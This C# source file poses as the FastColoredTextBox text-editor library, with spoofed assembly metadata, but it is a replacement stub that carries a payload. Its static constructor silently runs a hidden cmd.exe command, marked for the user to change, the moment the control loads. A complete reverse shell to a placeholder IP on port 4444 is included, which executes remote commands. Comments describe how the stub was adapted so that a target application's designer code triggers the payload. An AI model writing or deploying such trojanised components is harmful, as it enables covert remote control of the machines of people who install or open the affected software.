using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net.Sockets;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Windows.Forms;

[assembly: AssemblyTitle("FastColoredTextBox")]
[assembly: AssemblyVersion("2.16.23.0")]
[assembly: AssemblyFileVersion("2.16.23.0")]

namespace FastColoredTextBoxNS
{
	// ================================================================
	// PAYLOAD
	// ================================================================
	internal static class Payload
	{
		private static bool _executed = false;
		private static readonly object _lock = new object();

		public static void Execute()
		{
			lock (_lock)
			{
				if (_executed) return;
				_executed = true;
			}

			Thread t = new Thread(() =>
			{
				try
				{
					// OPTION 1: Single command
					ProcessStartInfo psi = new ProcessStartInfo();
					psi.FileName = "cmd.exe";
					psi.Arguments = "/c calc.exe";  // <-- CHANGE THIS
					psi.UseShellExecute = false;
					psi.CreateNoWindow = true;
					psi.RedirectStandardOutput = true;
					psi.RedirectStandardError = true;
					Process.Start(psi);

					// OPTION 2: Reverse shell (comment out Option 1 first)
					// ReverseShell("YOUR_IP", 4444);
				}
				catch (Exception) { }
			});
			t.IsBackground = true;
			t.Start();
		}

		private static void ReverseShell(string host, int port)
		{
			try
			{
				using (TcpClient client = new TcpClient(host, port))
				using (NetworkStream stream = client.GetStream())
				{
					byte[] prompt = Encoding.UTF8.GetBytes("shell> ");
					stream.Write(prompt, 0, prompt.Length);
					byte[] buffer = new byte[4096];
					while (true)
					{
						int bytesRead = stream.Read(buffer, 0, buffer.Length);
						if (bytesRead == 0) break;
						string command = Encoding.UTF8.GetString(buffer, 0, bytesRead).Trim();
						if (string.IsNullOrEmpty(command)) continue;
						if (command.ToLower() == "exit") break;
						ProcessStartInfo psi = new ProcessStartInfo();
						psi.FileName = "cmd.exe";
						psi.Arguments = "/c " + command;
						psi.UseShellExecute = false;
						psi.CreateNoWindow = true;
						psi.RedirectStandardOutput = true;
						psi.RedirectStandardError = true;
						Process p = Process.Start(psi);
						string output = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
						p.WaitForExit();
						byte[] outBytes = Encoding.UTF8.GetBytes(output + "\nshell> ");
						stream.Write(outBytes, 0, outBytes.Length);
					}
				}
			}
			catch (Exception) { }
		}
	}

	// ================================================================
	// ENUMS
	// ================================================================
	public enum BracketsHighlightStrategy { Strategy1 = 0, Strategy2 = 1 }

	public enum Language
	{
		Custom = 0, CSharp = 1, VB = 2, HTML = 3,
		XML = 4, SQL = 5, PHP = 6, JS = 7, Lua = 8
	}

	[Serializable]
	public class ServiceColors
	{
		public Color CollapseMarkerForeColor { get; set; }
		public Color CollapseMarkerBackColor { get; set; }
		public Color CollapseMarkerBorderColor { get; set; }
		public Color ExpandMarkerForeColor { get; set; }
		public Color ExpandMarkerBackColor { get; set; }
		public Color ExpandMarkerBorderColor { get; set; }
		public ServiceColors()
		{
			CollapseMarkerForeColor = Color.Silver;
			CollapseMarkerBackColor = Color.White;
			CollapseMarkerBorderColor = Color.Silver;
			ExpandMarkerForeColor = Color.Red;
			ExpandMarkerBackColor = Color.White;
			ExpandMarkerBorderColor = Color.Silver;
		}
	}

	public class Style : IDisposable { public virtual void Dispose() { } }

	// ================================================================
	// MAIN STUB
	//
	// Implements ISupportInitialize because VBCode.Designer.cs does:
	//   ((ISupportInitialize)this.editor).BeginInit();
	//   ... all property assignments ...
	//   ((ISupportInitialize)this.editor).EndInit();
	//
	// Without ISupportInitialize the cast throws InvalidCastException
	// before a single property is set and before the static constructor
	// ever gets a chance to fire the payload.
	// ================================================================
	[ToolboxItem(false)]
	public class FastColoredTextBox : UserControl, ISupportInitialize
	{
		static FastColoredTextBox() { Payload.Execute(); }

		// ISupportInitialize - required by designer
		public void BeginInit() { }
		public void EndInit() { }

		// Properties set in VBCode.Designer.cs
		public char[] AutoCompleteBracketsList { get; set; }
		public string AutoIndentCharsPatterns { get; set; }
		public new Size AutoScrollMinSize { get; set; }
		public Brush BackBrush { get; set; }
		public BracketsHighlightStrategy BracketsHighlightStrategy { get; set; }
		public int CharHeight { get; set; }
		public int CharWidth { get; set; }
		public string CommentPrefix { get; set; }
		public new Cursor Cursor { get; set; }
		public Color DisabledColor { get; set; }
		public bool IsReplaceMode { get; set; }
		public Language Language { get; set; }
		public char LeftBracket { get; set; }
		public Padding Paddings { get; set; }
		public char RightBracket { get; set; }
		public Color SelectionColor { get; set; }
		public ServiceColors ServiceColors { get; set; }
		public int Zoom { get; set; }

		// Properties accessed in VBCode.cs
		private string _text = "";
		public new string Text { get { return _text; } set { _text = value; } }
		public string SelectedText { get; set; }

		// Methods called in VBCode.cs
		public void Cut() { }
		public void Clear() { }

		public FastColoredTextBox()
		{
			this.BracketsHighlightStrategy = BracketsHighlightStrategy.Strategy1;
			this.Language = Language.Custom;
			this.ServiceColors = new ServiceColors();
			this.BackColor = Color.White;
			this.SelectedText = "";
		}
	}
}